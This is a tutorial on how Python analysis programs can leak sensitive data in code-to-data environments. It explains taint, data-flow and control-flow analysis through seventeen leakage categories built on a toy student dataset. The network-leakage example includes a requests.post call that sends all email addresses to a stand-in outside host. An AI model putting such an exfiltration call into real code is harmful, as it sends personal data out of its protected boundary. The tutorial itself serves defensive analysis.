# Who Let the Data Out?

## 1. Introduction

Data protection is often approached by controlling access to data. Sensitive datasets are stored in protected environments, and only authorized users are allowed to access them.

However, another approach is becoming increasingly important: instead of bringing the data to the analysis, we bring the analysis to the data.

In such a **code-to-data** setting, a researcher or analyst provides a program that is executed close to the protected dataset. The original data remains inside the protected environment, while only the result of the computation is returned.

A simplified architecture looks like this:

```text
Analyst
   |
   | Python program
   v
Protected Environment
   |
   | program executes
   v
Sensitive Dataset
   |
   | approved result
   v
Analyst
```

This approach can reduce the need to distribute copies of sensitive datasets.

However, it introduces another problem:

> If a program is allowed to access sensitive data, how can we determine whether the program itself might disclose that data?

Consider:

```python
def analyze(df):
    return df["email"].tolist()
```

The dataset has never left the protected environment as a file, but its contents have effectively been disclosed through the program's result.

Leakage can also be less obvious:

```python
def analyze(df):
    x = df["email"]
    y = x.tolist()
    return y
```

Or it may happen through another output channel:

```python
def analyze(df):
    print(df["email"])
    return len(df)
```

More complicated programs may reveal information indirectly through aggregations, conditions, functions, combinations of attributes, or repeated analyses.

Therefore, protecting the dataset is not sufficient. The programs that operate on the dataset must also be analyzed.

This tutorial introduces different categories of data leakage that can occur in Python analysis programs and the program-analysis concepts needed to understand them.

---

# 2. Background

## 2.1 Example Dataset

Throughout this tutorial, assume that we have a small dataset containing student information.

| student_id | name  | email             | age | city      | grade |
|------------|-------|-------------------|-----|-----------|-------|
| 101        | Alice | alice@example.com | 21  | Rotterdam | 8.5   |
| 102        | Bob   | bob@example.com   | 22  | Leiden    | 7.0   |
| 103        | Carol | carol@example.com | 21  | Delft     | 9.0   |
| 104        | David | david@example.com | 23  | Rotterdam | 6.5   |
| 105        | Emma  | emma@example.com  | 22  | Leiden    | 8.0   |

Assume that Python loads the dataset into a pandas DataFrame called `df`.

For example:

```python
import pandas as pd

df = pd.read_csv("students.csv")
```

We will use this dataset to illustrate different kinds of information disclosure.

---

## 2.2 Sensitive Data

Sensitive data is information that should not be disclosed without appropriate authorization.

In our example, the student's grade is sensitive information:

```text
grade
```

Other datasets may contain much more sensitive attributes, such as medical information, salary, financial information, or personal circumstances.

Whether an attribute is sensitive depends on the dataset and its intended use.

---

## 2.3 Direct Identifiers

A **direct identifier** is an attribute that can directly identify an individual.

Examples include:

- name;
- email address;
- student number;
- telephone number;
- national identification number.

In our example:

```text
student_id
name
email
```

are treated as direct identifiers.

Returning such an attribute may immediately reveal who a record belongs to.

---

## 2.4 Quasi-Identifiers

Not every identifying attribute directly contains a person's identity.

A **quasi-identifier** is an attribute that may not uniquely identify someone by itself but may contribute to identification when combined with other information.

Examples include:

- age;
- postcode;
- city;
- occupation;
- gender;
- date of birth.

Suppose a dataset contains:

```text
age = 21
city = Delft
```

Neither value necessarily identifies someone independently.

However, the combination may correspond to only one person in a particular dataset or may become identifying when combined with external information.

Therefore, removing names and email addresses does not automatically make individual-level data safe to disclose.

---

## 2.5 Aggregation

Instead of returning individual records, an analysis often returns a summary of multiple records. This is called **aggregation**.

For example:

```python
df["grade"].mean()
```

might produce:

```text
7.8
```

The output represents multiple students rather than one particular student.

Other common aggregates include:

```python
df["grade"].sum()
df["grade"].min()
df["grade"].max()
df["grade"].count()
```

Aggregation is often useful for reducing disclosure risk.

However:

> Aggregated information is not automatically privacy-safe.

For example, suppose we calculate:

```python
df.groupby("city")["grade"].mean()
```

If only one person belongs to a particular city, that city's average is exactly that person's grade.

Therefore, the size of the group can be important.

---

## 2.6 Minimum Group Size

One simple privacy rule is to require every reported group to contain at least a certain number of individuals.

For this tutorial, assume:

```text
minimum group size = 3
```

An aggregate calculated from three or more individuals may be released, while an aggregate based on one or two individuals is not permitted.

This is only a simplified educational rule. A minimum group size by itself does not guarantee anonymity.

---

## 2.7 Data Leakage

For this tutorial, **data leakage** means that information protected by a privacy policy becomes observable outside its permitted boundary.

A very obvious example is:

```python
return df["email"].tolist()
```

However, leakage does not necessarily require returning the original value directly.

Sensitive information may be:

- copied;
- transformed;
- passed through functions;
- used in conditions;
- written to files;
- printed to logs;
- transmitted over a network;
- encoded in another output;
- revealed by an aggregate;
- inferred by combining multiple outputs.

Understanding these different cases requires analyzing how the program behaves.

---

## 2.8 Static Code Analysis

**Static code analysis** examines a program without executing it.

For example, consider:

```python
def analyze(df):
    emails = df["email"]
    return emails
```

A static analyzer can inspect the source code and recognize that the program accesses the `email` column and returns its contents.

Static analysis can inspect properties such as:

- variable assignments;
- function calls;
- control flow;
- imported libraries;
- file operations;
- network operations;
- relationships between values.

One advantage is that potentially dangerous code can be inspected **before it executes**.

A limitation is that some properties depend on runtime data and cannot always be determined from the source code alone.

---

## 2.9 Data-Flow Analysis

**Data-flow analysis** studies how values move through a program.

Consider:

```python
x = df["email"]
y = x
z = y.tolist()

return z
```

The relevant flow is:

```text
df["email"]
     |
     v
     x
     |
     v
     y
     |
     v
     z
     |
     v
   return
```

The returned variable is called `z`, but its contents originate from `df["email"]`.

Looking only at the variable being returned would therefore be insufficient.

---

## 2.10 Sources and Sinks

Information-flow security commonly distinguishes between **sources** and **sinks**.

A **source** is where protected information enters the computation.

For example:

```python
df["email"]
df["student_id"]
df["grade"]
```

A **sink** is a place where information may become observable outside the permitted boundary.

Examples may include:

```python
return value
print(value)
file.write(value)
requests.post(..., data=value)
```

A useful question is therefore:

> Can information originating from a sensitive source reach an unauthorized sink?

---

## 2.11 Taint Analysis

**Taint analysis** is a form of information-flow analysis.

A value originating from a sensitive source can conceptually be marked, or *tainted*.

For example:

```python
emails = df["email"]
```

`emails` contains sensitive information.

If we then execute:

```python
x = emails
y = x.tolist()
```

the sensitivity propagates:

```text
email -> emails -> x -> y
```

If `y` reaches an unauthorized sink:

```python
return y
```

the analyzer reports a possible information flow from sensitive data to an observable output.

---

## 2.12 Control-Flow Analysis

Programs do not always execute statements sequentially.

Consider:

```python
if debug:
    return df["email"].tolist()

return len(df)
```

Whether sensitive information is returned depends on the value of `debug`.

**Control-flow analysis** studies the possible execution paths through a program.

It is important because a privacy violation may exist only on one particular path.

---

## 2.13 Interprocedural Analysis

Information may also move between functions.

Consider:

```python
def get_emails(df):
    return df["email"].tolist()

def analyze(df):
    x = get_emails(df)
    return x
```

Understanding the privacy properties of `analyze()` requires understanding what `get_emails()` does.

Analysis that reasons across function boundaries is called **interprocedural analysis**.

---

## 2.14 Explicit and Implicit Information Flow

An **explicit information flow** directly transfers a sensitive value.

For example:

```python
x = df["grade"].max()
return x
```

The sensitive value directly becomes the output.

An **implicit information flow** occurs when sensitive information influences the output indirectly through program control.

For example:

```python
if df["grade"].max() > 9:
    return 1
else:
    return 0
```

The actual grade is never returned.

Nevertheless, the output tells us something about the grades.

Therefore, information can flow without a direct assignment between the sensitive value and the output.

---

## 2.15 LLM-Based Code Analysis

Large Language Models (LLMs) can also be used to analyze source code.

Instead of defining every analysis rule using traditional program-analysis algorithms, an LLM can be given:

- the Python program;
- a description of the dataset;
- a privacy policy;
- instructions describing permitted and prohibited behavior.

The LLM can then reason about whether the program violates the policy.

For example, it may recognize that:

```python
emails = df["email"]
return emails.tolist()
```

discloses email addresses.

LLMs can potentially reason about complicated code and natural-language policies.

However, LLM analysis also has limitations. An LLM may:

- miss a real problem;
- report a problem where none exists;
- interpret an ambiguous policy differently;
- produce different conclusions for semantically equivalent programs.

Traditional static analysis and LLM-based analysis therefore represent different approaches to analyzing program behavior.

---

# 3. Categories of Data Leakage

The following sections move from simple leakage patterns to more complicated forms of information disclosure.

---

## 3.1 Category A — Direct Disclosure

### Scenario

The simplest leakage occurs when a program directly returns a protected attribute.

### Example

```python
def analyze(df):
    return df["email"].tolist()
```

### Result

```text
[
    "alice@example.com",
    "bob@example.com",
    "carol@example.com",
    ...
]
```

### Explanation

The `email` attribute is a direct identifier.

The program reads the protected column and sends its values directly to the output.

The information flow is:

```text
email -> return
```

This is a direct privacy violation.

---

## 3.2 Category B — Sensitive Data Access Without Disclosure

### Scenario

A program may access sensitive information without necessarily disclosing it.

### Example

```python
def analyze(df):
    emails = df["email"]

    return {
        "number_of_students": len(emails)
    }
```

### Result

```text
{"number_of_students": 5}
```

### Explanation

The program accesses the email column, but the email addresses themselves do not reach the output.

The output contains only the number of records.

Therefore, under a policy that prohibits **disclosure** rather than **access**, this program may be acceptable.

This distinction is important:

> Accessing sensitive information and leaking sensitive information are different properties.

---

## 3.3 Category C — Leakage Through Variable Propagation

### Scenario

Sensitive information may pass through several variables before it reaches an output.

### Example

```python
def analyze(df):
    x = df["email"]
    y = x
    z = y.tolist()

    return z
```

### Result

The program returns the email addresses.

### Explanation

The relevant information flow is:

```text
df["email"]
     |
     v
     x
     |
     v
     y
     |
     v
     z
     |
     v
   return
```

Searching only for something such as:

```python
return df["email"]
```

would miss this example.

Data-flow or taint analysis is needed to track the sensitive information through the variables.

---

## 3.4 Category D — Leakage After Transformation

### Scenario

A program may transform sensitive information before releasing it.

Transformation does not automatically make information safe.

### Example

```python
def analyze(df):
    emails = df["email"]
    domains = emails.str.split("@").str[-1]

    return domains.tolist()
```

### Result

The program may return:

```text
[
    "example.com",
    "example.com",
    "example.com",
    ...
]
```

### Explanation

The original email addresses are not returned.

However, information derived from each individual's email address is still released at the individual-record level.

Whether this transformation is acceptable depends on the privacy policy.

The important lesson is:

> A transformation is not automatically equivalent to anonymization.

---

## 3.5 Category E — Leakage Across Functions

### Scenario

Sensitive information may be accessed in one function and disclosed in another.

### Example

```python
def extract_emails(df):
    return df["email"].tolist()


def analyze(df):
    result = extract_emails(df)
    return result
```

### Result

The program returns the email addresses.

### Explanation

The sensitive source does not appear directly inside `analyze()`.

The information flow crosses a function boundary:

```text
df["email"]
      |
      v
extract_emails()
      |
      v
   result
      |
      v
    return
```

Detecting this requires reasoning across functions.

---

## 3.6 Category F — Conditional Leakage

### Scenario

A program may disclose information only under certain conditions.

### Example

```python
def analyze(df, debug=False):

    if debug:
        return df["email"].tolist()

    return {"count": len(df)}
```

### Result

For:

```python
debug = False
```

the program returns only the number of records.

For:

```python
debug = True
```

the program returns the email addresses.

### Explanation

The program contains at least one execution path that discloses sensitive information.

An analyzer therefore needs to consider possible execution paths rather than inspecting only the most common path.

---

## 3.7 Category G — Unreachable Leakage Code

### Scenario

Sensitive-looking code may exist in a program but never execute.

### Example

```python
def analyze(df):

    if False:
        return df["email"].tolist()

    return {"count": len(df)}
```

### Result

The program always returns:

```text
{"count": 5}
```

### Explanation

The statement containing the email addresses is unreachable.

A simple keyword-based checker might still report:

```text
email + return = leak
```

A control-flow-aware analyzer can recognize that this path cannot execute.

This distinction is useful when studying false alarms.

---

## 3.8 Category H — Safe Aggregation

### Scenario

Instead of returning individual records, a program returns a statistical summary.

### Example

```python
def analyze(df):
    return {
        "average_grade": df["grade"].mean()
    }
```

### Result

The program might return:

```text
{"average_grade": 7.8}
```

### Explanation

The output represents multiple individuals rather than exposing their individual grades.

Under our simplified policy, this can be considered acceptable when the aggregation represents a sufficiently large group.

However, aggregation alone does not guarantee privacy.

---

## 3.9 Category I — Small-Group Leakage

### Scenario

An aggregate can reveal individual information when it represents too few people.

### Example

```python
def analyze(df):
    result = df.groupby("city")["grade"].mean()

    return result.to_dict()
```

### Result

Suppose the result contains:

```text
{
    "Rotterdam": 7.5,
    "Leiden": 7.5,
    "Delft": 9.0
}
```

### Explanation

Only Carol lives in Delft in our example dataset.

Therefore:

```text
average grade of students in Delft = Carol's grade
```

The value `9.0` effectively reveals an individual's grade.

The program itself does not explicitly return Carol's record. The privacy problem emerges from the relationship between the aggregation and the data.

This illustrates why some privacy properties cannot be determined from source code alone.

---

## 3.10 Category J — Quasi-Identifier Leakage

### Scenario

A program may remove direct identifiers but still return combinations of attributes that make individuals distinguishable.

### Example

```python
def analyze(df):
    return df[
        ["age", "city"]
    ].to_dict("records")
```

### Result

The output might contain:

```text
[
    {"age": 21, "city": "Rotterdam"},
    {"age": 22, "city": "Leiden"},
    {"age": 21, "city": "Delft"},
    ...
]
```

### Explanation

Names and email addresses are absent.

Nevertheless, combinations such as:

```text
21 + Delft
```

may identify a person when combined with other information.

Therefore:

> Removing direct identifiers is not necessarily sufficient to prevent re-identification.

---

## 3.11 Category K — Implicit Information Flow

### Scenario

Sensitive information influences the output through a decision rather than being returned directly.

### Example

```python
def analyze(df):

    if df["grade"].max() > 9:
        return {"result": 1}

    return {"result": 0}
```

### Result

Suppose the program returns:

```text
{"result": 1}
```

### Explanation

The observer learns:

```text
At least one student has a grade greater than 9.
```

No individual grade has been returned.

Nevertheless, information about the sensitive column has influenced an observable result.

The flow is approximately:

```text
grade
  |
  v
condition
  |
  v
branch selected
  |
  v
output
```

This is an example of implicit information flow.

Whether this particular disclosure is acceptable depends on the privacy policy.

---

## 3.12 Category L — Leakage Through Logs

### Scenario

The official result may be safe while sensitive information is disclosed through logging or debugging output.

### Example

```python
def analyze(df):

    print(df["email"].tolist())

    return {
        "count": len(df)
    }
```

### Result

The returned result is:

```text
{"count": 5}
```

but the program also prints all email addresses.

### Explanation

`return` is not the only possible information sink.

If logs are visible outside the protected environment, then:

```python
print(...)
```

can become a disclosure channel.

A privacy analysis should therefore identify all relevant output channels.

---

## 3.13 Category M — Leakage Through Files

### Scenario

A program stores protected information in a file.

### Example

```python
def analyze(df):

    df["email"].to_csv(
        "emails.csv",
        index=False
    )

    return {"status": "completed"}
```

### Result

The returned value contains no personal information.

However, the program creates a file containing email addresses.

### Explanation

File operations can create another path by which information leaves its intended boundary.

A secure execution policy may therefore prohibit file writes entirely or restrict them to controlled locations and formats.

---

## 3.14 Category N — Leakage Through Network Communication

### Scenario

A program attempts to transmit information to an external system.

### Example

```python
import requests


def analyze(df):

    requests.post(
        "https://example.org/collect",
        json={
            "emails": df["email"].tolist()
        }
    )

    return {"status": "completed"}
```

### Result

The returned value looks harmless.

However, the email addresses are sent through another communication channel.

### Explanation

The sensitive information flow is:

```text
email
  |
  v
HTTP request
  |
  v
external system
```

Network communication is therefore an important sink in security-oriented program analysis.

---

## 3.15 Category O — Leakage Through Error Messages

### Scenario

Sensitive information can accidentally become part of an error or exception message.

### Example

```python
def analyze(df):

    try:
        raise ValueError(
            f"Invalid email: {df['email'].iloc[0]}"
        )

    except ValueError as error:
        return {
            "error": str(error)
        }
```

### Result

The result might contain:

```text
{"error": "Invalid email: alice@example.com"}
```

### Explanation

The programmer may not have intended to return an email address.

Nevertheless, sensitive information becomes part of the exception message and reaches the output.

Error handling must therefore also be considered during privacy analysis.

---

## 3.16 Category P — Leakage Through Multiple Queries

### Scenario

Individual outputs may appear acceptable but reveal sensitive information when combined.

Consider two analyses.

### Analysis 1

```python
def analyze(df):
    return {
        "total_grade": df["grade"].sum()
    }
```

Suppose it returns:

```text
39
```

### Analysis 2

```python
def analyze(df):

    subset = df[
        df["student_id"] != 101
    ]

    return {
        "total_grade": subset["grade"].sum()
    }
```

Suppose it returns:

```text
30.5
```

### Result

An observer can calculate:

```text
39 - 30.5 = 8.5
```

and therefore determine the grade associated with student 101.

### Explanation

Neither result necessarily exposes an individual grade by itself.

The leakage appears through the **composition of multiple results**.

This type of disclosure is significantly harder to detect because analyzing one program independently may not provide enough information.

---

## 3.17 Category Q — Leakage Through Returned Models or Objects

### Scenario

Programs may return complex objects rather than simple statistics.

Calling an object a "model" does not automatically make it privacy-safe.

### Example

```python
def analyze(df):

    model = {
        "known_emails":
            df["email"].tolist()
    }

    return model
```

### Result

The returned object contains all email addresses.

### Explanation

Privacy analysis must examine the information contained in an output rather than relying on its variable name or intended purpose.

More sophisticated machine-learning models can also memorize information from training data. Evaluating such leakage may require techniques beyond ordinary source-code analysis.

---

# 4. From Simple Leakage to Information-Flow Analysis

The categories above form a progression.

The simplest case is:

```text
Sensitive Data
      |
      v
    Output
```

More complicated programs introduce intermediate operations:

```text
Sensitive Data
      |
      v
   Variable
      |
      v
Transformation
      |
      v
   Function
      |
      v
    Output
```

Still more complicated cases introduce control dependencies:

```text
Sensitive Data
      |
      v
  Condition
    /   \
   v     v
 Path A Path B
    \   /
     v v
    Output
```

And some privacy risks depend on information outside the program itself:

```text
Program
   +
Dataset Properties
   +
Previous Outputs
   +
External Knowledge
   |
   v
Privacy Risk
```

This distinction is important because not every privacy question can be answered by inspecting Python syntax alone.

---

# 5. Summary

Protecting a dataset does not automatically prevent information disclosure.

When programs are allowed to execute on sensitive data, the programs themselves become part of the security and privacy boundary.

Different kinds of leakage require different forms of reasoning:

| Category | Main Concept |
|---|---|
| Direct disclosure | Sensitive sources and outputs |
| Access without disclosure | Access vs. information flow |
| Variable propagation | Data-flow analysis |
| Transformation | Derived information |
| Functions | Interprocedural analysis |
| Conditional leakage | Control-flow analysis |
| Unreachable code | Reachability |
| Aggregation | Statistical disclosure |
| Small groups | Group-size protection |
| Quasi-identifiers | Re-identification |
| Implicit flow | Control dependencies |
| Logging | Alternative sinks |
| Files | Persistent output channels |
| Network | External communication |
| Errors | Exception-based disclosure |
| Multiple queries | Composition |
| Models | Complex derived outputs |

The central question behind many of these categories is:

> Can protected information influence something observable outside the permitted boundary?

Static code analysis, data-flow analysis, taint analysis, information-flow analysis, and LLM-based code analysis provide different ways of answering parts of this question.

The harder cases demonstrate an equally important lesson:

> Some privacy properties depend not only on the program, but also on the dataset, execution environment, previous queries, and privacy policy.

Understanding that boundary is essential when designing systems that automatically review analysis programs before allowing them to execute on sensitive data.